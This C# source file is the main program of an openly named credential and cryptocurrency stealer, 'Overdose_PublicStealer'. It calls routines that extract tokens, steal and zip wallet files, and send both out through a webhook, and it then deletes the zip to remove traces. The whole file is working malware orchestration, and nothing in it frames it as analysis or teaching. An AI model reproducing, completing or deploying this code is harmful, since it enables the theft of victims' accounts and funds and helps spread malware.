using System;
using System.Collections.Generic; // Required for List<string>
using System.Threading.Tasks; // Required for Task
using System.IO; // Required for File.Delete
using PublicStealer.wallet;

namespace Overdose_PublicStealer
{
    internal class Program
    {
        // Main method is the entry point of the application.
        // It's marked as async to properly await the asynchronous operations.
        static async Task Main(string[] args) // Changed Main to async Task
        {
            string walletZipPath = null;

            try
            {
                Console.WriteLine("Starting data exfiltration...");
                // --- Token Stealing ---
                // Call the TokenExtractor directly from Program.cs
                List<string> stolenTokens = TokenExtractor.GetTokens();
                Console.WriteLine($"Found {stolenTokens.Count} tokens.");

                // --- Wallet Stealing ---
                // Call the WalletStealer method to steal and zip wallets.
                // It now returns the zip file path.
                walletZipPath = await WalletStealer.StealAndZipWallets(); // Get wallet zip path
                if (!string.IsNullOrEmpty(walletZipPath))
                {
                    Console.WriteLine($"Wallets zipped to: {walletZipPath}");
                }
                else
                {
                    Console.WriteLine("No wallets found or failed to zip.");
                }

                // --- Send Combined Report via WebhookSender ---
                Console.WriteLine("Sending combined report via webhook...");
                // Call the WebhookSender to send a single report with all data and files.
                await WebhookSender.SendCombinedReport(stolenTokens, walletZipPath); // Pass all data

                Console.WriteLine("Data exfiltration process finished.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred during the process: {ex}");
            }
            finally
            {
                // --- Cleanup Temporary Zip Files ---
                // Ensure temporary zip files are deleted after sending (or failure).
                if (!string.IsNullOrEmpty(walletZipPath) && File.Exists(walletZipPath))
                {
                    try
                    {
                        File.Delete(walletZipPath);
                        Console.WriteLine($"Cleaned up temporary wallet zip: {walletZipPath}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error cleaning up wallet zip {walletZipPath}: {ex.Message}");
                    }
                }
            }

            // Keep the console window open if running as a console application for debugging
            // Console.ReadKey();
        }
    }
}
